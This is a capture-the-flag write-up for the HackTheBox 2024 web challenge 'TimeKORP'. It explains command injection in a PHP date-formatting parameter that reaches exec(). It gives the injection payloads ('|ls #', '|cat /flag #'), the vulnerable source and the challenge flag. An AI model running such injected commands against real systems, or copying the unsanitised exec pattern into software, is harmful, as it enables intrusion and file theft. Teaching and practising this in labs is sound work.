---
name: TimeKORP (2024)
event: HackTheBox Cyber Apocalypse CTF 2024
category: Web
description: Writeup for TimeKORP (Web) - HackTheBox Cyber Apocalypse CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# TimeKORP

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/-vhl8ixthO4/0.jpg)](https://www.youtube.com/watch?v=-vhl8ixthO4?t=99 "HackTheBox Cyber Apocalypse '24: Time KORP (web)")

## Description

> TBD

## Solution

First things first; download the source and run the local docker instance for easy/fast debugging.

It's also a good idea to check the site functionality before reviewing the source code so that things fall into place more easily.

The site displays the time (`http://127.0.0.1:1337/?format=%H:%M:%S`) or date (`http://127.0.0.1:1337/?format=%Y-%m-%d`).

Opting for the lazy route, I check the burp scanner and find some interesting results. The first is XSS (reflected), presumably not much use as there was no admin bot to submit a URL to. The second is command injection 👀

Here's the URL-decoded [PoC](http://127.0.0.1:1337/?format=%25H%3a%25M%3a%25S%7cecho%20kefbjki4ag%20d6tyxfigki%7c%7ca%20%23'%20%7cecho%20kefbjki4ag%20d6tyxfigki%7c%7ca%20%23%7c%22%20%7cecho%20kefbjki4ag%20d6tyxfigki%7c%7ca%20%23) from burp:

{% code overflow="wrap" %}
```
/?format=%H:%M:%S|echo kefbjki4ag d6tyxfigki||a #' |echo kefbjki4ag d6tyxfigki||a #|" |echo kefbjki4ag d6tyxfigki||a #
```
{% endcode %}

The result indicates that the `echo kefbjki4ag d6tyxfigki` command did indeed execute.

{% code overflow="wrap" %}
```html
</span> kefbjki4ag d6tyxfigki<span class='text-muted'>.</span>
```
{% endcode %}

The payload syntax/length is a little confusing so I keep removing elements and re-testing to ensure the command still executes. The attack can be simplified to:

{% code overflow="wrap" %}
```
/?format=%H:%M:%S' |ls #
```
{% endcode %}

If we [URL-encode it](http://127.0.0.1:1337/?format=%25H%3a%25M%3a%25S'+|ls+%23) it lists the `views` directory. If we look around for a while we might not see the flag. Let's just check the source code and see the Dockerfile has the following line.

{% code overflow="wrap" %}
```dockerfile
# Copy flag
COPY flag /flag
```
{% endcode %}

Therefore, we can print the flag with [this payload](http://127.0.0.1:1337/?format=%25H%3a%25M%3a%25S'+|cat+/flag+%23) to retrieve the flag.

{% code overflow="wrap" %}
```
/?format=%H:%M:%S' |cat /flag #
```
{% endcode %}

We've already solved the challenge but why not review the vulnerable source code. Notice `TimeController.php` processes our vulnerable GET parameter (`format`).

{% code overflow="wrap" %}
```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```
{% endcode %}

It passes our user input (🚫) to the `TimeModel.php` constructor which then executes the command.

{% code overflow="wrap" %}
```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```
{% endcode %}

So, assuming we submit `format=%H:%M:%S' |cat /flag #`, the `command` property of the object will be:

{% code overflow="wrap" %}
```bash
date '%H:%M:%S'' |cat /flag # 2>&1
```
{% endcode %}

Due to us closing off the string and inserting a pipe character, we were able to inject a malicious command! Crucially, we also needed to add a hash character afterwards, to prevent the output from being redirected.

Flag: `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}`
